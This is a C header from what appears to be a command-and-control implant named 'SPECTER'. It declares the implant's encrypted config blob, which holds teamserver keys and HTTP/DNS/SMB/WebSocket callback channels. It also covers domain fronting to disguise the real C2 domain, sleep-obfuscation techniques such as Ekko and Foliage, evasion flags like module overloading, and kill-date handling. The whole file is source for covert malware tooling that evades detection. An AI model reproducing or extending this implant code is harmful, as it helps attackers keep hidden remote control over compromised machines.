/**
 * SPECTER Implant — Config Store Interface
 *
 * Encrypted configuration blob management: locate config appended after
 * PIC blob, decrypt, parse into IMPLANT_CONFIG, provide runtime access,
 * in-memory encryption for sleep protection, and kill-date enforcement.
 */

#ifndef CONFIG_H
#define CONFIG_H

#include "specter.h"
#include "crypto.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

#define CONFIG_MAGIC           0x53504543  /* "SPEC" little-endian     */
#define CONFIG_VERSION         1
#define CONFIG_MAX_CHANNELS    4
#define CONFIG_KEY_INPUT_SIZE  64          /* Bytes of PIC hashed for key */
#define CONFIG_SCAN_MAX        0x80000     /* 512 KB scan limit         */
#define CONFIG_SCAN_START      256         /* Skip first 256 bytes      */

/* ------------------------------------------------------------------ */
/*  Channel type enumeration                                           */
/* ------------------------------------------------------------------ */

typedef enum _CHANNEL_TYPE {
    CHANNEL_HTTP      = 0,
    CHANNEL_DNS       = 1,
    CHANNEL_SMB       = 2,
    CHANNEL_WEBSOCKET = 3,
} CHANNEL_TYPE;

/* ------------------------------------------------------------------ */
/*  Sleep method enumeration                                           */
/* ------------------------------------------------------------------ */

typedef enum _SLEEP_METHOD {
    SLEEP_DELAY      = 0,   /* NtDelayExecution (safe default) */
    SLEEP_WFS        = 1,   /* WaitForSingleObject        */
    SLEEP_EKKO       = 2,   /* Timer queue sleep masking   */
    SLEEP_FOLIAGE    = 3,   /* APC-based sleep obfuscation */
    SLEEP_THREADPOOL = 4,   /* Thread pool timer hijack    */
} SLEEP_METHOD;

/* ------------------------------------------------------------------ */
/*  CHANNEL_CONFIG                                                     */
/* ------------------------------------------------------------------ */

typedef struct _CHANNEL_CONFIG {
    char   url[256];       /* Teamserver URL / hostname               */
    DWORD  port;           /* Port number                             */
    DWORD  type;           /* CHANNEL_TYPE                            */
    DWORD  priority;       /* Lower = higher priority (0 = primary)   */
    DWORD  active;         /* Boolean: channel currently active        */
    /* Domain fronting support: when sni_domain is non-empty, TLS       */
    /* ClientHello uses sni_domain while HTTP Host uses host_domain.    */
    char   sni_domain[256];  /* TLS SNI value (front domain)          */
    char   host_domain[256]; /* HTTP Host header (actual C2 domain)   */
    DWORD  needs_tls;        /* TRUE if channel URL uses https://     */
} CHANNEL_CONFIG;

/* ------------------------------------------------------------------ */
/*  IMPLANT_CONFIG                                                     */
/* ------------------------------------------------------------------ */

typedef struct _IMPLANT_CONFIG {
    BYTE           teamserver_pubkey[32];
    BYTE           implant_privkey[32];
    BYTE           implant_pubkey[32];
    BYTE           module_signing_key[32];
    DWORD          sleep_interval;     /* Milliseconds between callbacks  */
    DWORD          jitter_percent;     /* 0–100                           */
    DWORD          sleep_method;       /* SLEEP_METHOD enum               */
    CHANNEL_CONFIG channels[CONFIG_MAX_CHANNELS];
    DWORD          channel_count;      /* Number of active channels       */
    DWORD          max_retries;        /* Max consecutive failures        */
    QWORD          kill_date;          /* FILETIME: 100-ns since 1601     */
    DWORD          profile_id;
    DWORD          checkin_count;      /* Incremented each check-in       */
    DWORD          evasion_flags;      /* Bitmask of enabled evasion mods */
} IMPLANT_CONFIG;

/* ------------------------------------------------------------------ */
/*  Evasion flag constants                                             */
/* ------------------------------------------------------------------ */

#define EVASION_FLAG_MODULE_OVERLOAD   0x01
#define EVASION_FLAG_PDATA_REGISTER    0x02
#define EVASION_FLAG_NTCONTINUE_ENTRY  0x04

/* ------------------------------------------------------------------ */
/*  Config blob header (appended after PIC binary by build_config.py)  */
/* ------------------------------------------------------------------ */

typedef struct _CONFIG_BLOB_HEADER {
    DWORD magic;           /* CONFIG_MAGIC                            */
    DWORD version;         /* CONFIG_VERSION                          */
    DWORD data_size;       /* Size of encrypted payload               */
    BYTE  nonce[12];       /* AEAD nonce                              */
    BYTE  tag[16];         /* AEAD tag                                */
} CONFIG_BLOB_HEADER;

/* ------------------------------------------------------------------ */
/*  API                                                                */
/* ------------------------------------------------------------------ */

/**
 * Locate config blob appended after PIC, decrypt, parse into
 * IMPLANT_CONFIG, and store pointer in ctx->config.
 */
NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx);

/**
 * Return pointer to the current IMPLANT_CONFIG.
 */
IMPLANT_CONFIG *cfg_get(IMPLANT_CONTEXT *ctx);

/**
 * Apply a signed config update from the teamserver.
 * data layout: [32-byte HMAC-SHA256 signature][serialized config]
 * Signature is verified with module_signing_key before applying.
 */
NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len);

/**
 * Encrypt config in-memory (called before sleep).
 */
NTSTATUS cfg_encrypt(IMPLANT_CONTEXT *ctx);

/**
 * Decrypt config in-memory (called after sleep).
 */
NTSTATUS cfg_decrypt(IMPLANT_CONTEXT *ctx);

/**
 * Returns TRUE if kill date has passed and implant should terminate.
 * A kill_date of 0 means no kill date (never expires).
 */
BOOL cfg_check_killdate(IMPLANT_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
/**
 * Set the PIC base address for testing (bypasses implant_entry lookup).
 */
void cfg_test_set_pic_base(PVOID base);

/**
 * Set the system time returned by cfg_check_killdate for testing.
 */
void cfg_test_set_system_time(QWORD time);
#endif

#endif /* CONFIG_H */
